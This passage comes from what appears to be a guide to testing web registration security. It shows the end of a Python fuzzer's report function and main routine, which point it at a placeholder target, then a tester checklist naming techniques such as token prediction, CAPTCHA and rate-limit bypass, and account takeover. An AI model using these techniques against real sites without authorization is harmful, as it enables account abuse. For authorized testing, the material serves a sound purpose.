            report += f"### {i}. {finding.vuln_type.value} ({finding.severity})\n\n"
            report += f"**Description:** {finding.description}\n\n"
            report += f"**Payload:** ```{json.dumps(finding.payload)}```\n\n"
            report += f"**Response:** {finding.response}\n\n"
            report += f"**Remediation:** {finding.remediation}\n\n"
            report += "---\n\n"

        return report

# Run the fuzzer
async def main():
    fuzzer = RegistrationFuzzer("https://target.com/api/register")
    findings = await fuzzer.run_all_tests()
    print(fuzzer.generate_report())

if __name__ == "__main__":
    asyncio.run(main())
```

---

## 6. Prevention Checklist

### For Security Testers

```markdown
## Registration Security Testing Checklist

### Input Validation
- [ ] Test duplicate email with race conditions
- [ ] Test email case sensitivity
- [ ] Test email dot manipulation (Gmail)
- [ ] Test plus addressing
- [ ] Test Unicode normalization
- [ ] Test username squatting
- [ ] Test mass assignment parameters
- [ ] Test hidden parameter injection

### Verification
- [ ] Test direct access without verification
- [ ] Test token manipulation
- [ ] Test token reuse
- [ ] Test token prediction
- [ ] Test verification status manipulation
- [ ] Test OAuth verification bypass
- [ ] Test CAPTCHA bypass
- [ ] Test rate limit bypass

### Logic Flaws
- [ ] Test self-referral
- [ ] Test referral code prediction
- [ ] Test invitation token reuse
- [ ] Test pre-registration claim
- [ ] Test orphaned account takeover
- [ ] Test incomplete deletion

### Rate Limiting
- [ ] Test header-based bypass
- [ ] Test distributed requests
- [ ] Test endpoint variation
- [ ] Test encoding bypass
```

---

## References

- OWASP Testing Guide - Identity Management Testing
- OWASP Authentication Cheat Sheet
- PortSwigger Web Security Academy - Authentication
- HackerOne Disclosed Reports - Registration Vulnerabilities
- Bug Bounty Bootcamp - Account Security Testing
